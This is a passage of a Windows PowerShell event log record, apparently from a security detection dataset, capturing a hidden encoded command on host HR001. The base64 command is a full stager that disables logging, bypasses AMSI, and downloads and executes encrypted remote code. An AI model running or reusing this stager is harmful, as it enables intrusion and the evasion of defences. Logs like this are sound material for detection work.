ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlAF0AOgA6AEQARQBGAEEAdQBMAHQATgBlAFQAdwBPAFIASwBDAHIARQBEAGUAbgB0AGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQANAAzAGUAZgAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAGUAbQAuAFQAZQB4AFQALgBFAG4AYwBvAGQAaQBOAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAFQAQgBZAHQARQBTACgAJwB+AGsAKgBfAEYAUwBqAHIAOAAlAHgAdwBlAEoANgBoAHwAUABLAC4AZgB7AFUATgBNAEgAdQBkAHAANQB5AG0AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAEQAZQAuAEcARQB0AFMAdAByAGkATgBHACgAWwBDAE8ATgB2AGUAcgBUAF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQgB6AEEARABvAEEATAB3AEEAdgBBAEQARQBBAE0AQQBBAHUAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAeABBAEQAQQBBAE4AZwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQANAAzAEUAZgAzAC4ASABlAEEAZABFAHIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AHoAbwBqADAAdgBDAE0ATwBsAFYAZQByADIARgBJAFMAZgBpAEYAawBSAEMAagBsAHIAOABjAD0AIgApADsAJABEAGEAVABhAD0AJAA0ADMARQBmADMALgBEAE8AdwBuAGwAbwBBAEQARABBAFQAYQAoACQAUwBlAHIAKwAkAFQAKQA7ACQAaQB2AD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABBAD0AJABkAEEAVABBAFsANAAuAC4AJABkAEEAdABBAC4AbABlAE4ARwB0AEgAXQA7AC0AagBvAGkAbgBbAEMASABhAHIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\n\tEngineVersion=5.1.17763.316\n\tRunspaceId=af4eb08f-cf11-45ec-bcd4-8f4fd11c1776\n\tPipelineId=1\n\tScriptName=\n\tCommandLine=            Start-Sleep -Seconds $sleepTime;","param3":"CommandInvocation(Start-Sleep): \"Start-Sleep\"\nParameterBinding(Start-Sleep): name=\"Seconds\"; value=\"5\"","param1":"            Start-Sleep -Seconds $sleepTime;"},"type":"wineventlog","record_number":"101797","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"task":"Pipeline Execution Details","computer_name":"HR001.shire.com","event_id":800,"opcode":"Info","source_name":"PowerShell","host":{"name":"WECserver"},"keywords":["Classic"],"log_name":"Windows PowerShell","level":"Information","message":"Pipeline execution details for command line:             Start-Sleep -Seconds $sleepTime;\n. \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=69902\n\n\tUserId=SHIRE\\nmartha\n\tHostName=ConsoleHost\n\tHostVersion=5.1.17763.316\n\tHostId=9189b674-b66f-4ae4-af64-65d46d4e78e4\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlAF0AOgA6AEQARQBGAEEAdQBMAHQATgBlAFQAdwBPAFIASwBDAHIARQBEAGUAbgB0AGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQANAAzAGUAZgAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAGUAbQAuAFQAZQB4AFQALgBFAG4AYwBvAGQAaQBOAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAFQAQgBZAHQARQBTACgAJwB+AGsAKgBfAEYAUwBqAHIAOAAlAHgAdwBlAEoANgBoAHwAUABLAC4AZgB7AFUATgBNAEgAdQBkAHAANQB5AG0AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAEQAZQAuAEcARQB0AFMAdAByAGkATgBHACgAWwBDAE8ATgB2AGUAcgBUAF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQgB6AEEARABvAEEATAB3AEEAdgBBAEQARQBBAE0AQQBBAHUAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAeABBAEQAQQBBAE4AZwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQANAAzAEUAZgAzAC4ASABlAEEAZABFAHIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AHoAbwBqADAAdgBDAE0ATwBsAFYAZQByADIARgBJAFMAZgBpAEYAawBSAEMAagBsAHIAOABjAD0AIgApADsAJABEAGEAVABhAD0AJAA0ADMARQBmADMALgBEAE8AdwBuAGwAbwBBAEQARABBAFQAYQAoACQAUwBlAHIAKwAkAFQAKQA7ACQAaQB2AD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABBAD0AJABkAEEAVABBAFsANAAuAC4AJABkAEEAdABBAC4AbABlAE4ARwB0AEgAXQA7AC0AagBvAGkAbgBbAEMASABhAHIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\n\tEngineVersion=5.1.17763.316\n\tRunspaceId=af4eb08f-cf11-45ec-bcd4-8f4fd11c1776\n\tPipelineId=1\n\tScriptName=\n\tCommandLine=            Start-Sleep -Seconds $sleepTime;\n \n\nDetails: \nCommandInvocation(Start-Sleep): \"Start-Sleep\"\nParameterBinding(Start-Sleep): name=\"Seconds\"; value=\"5\""}
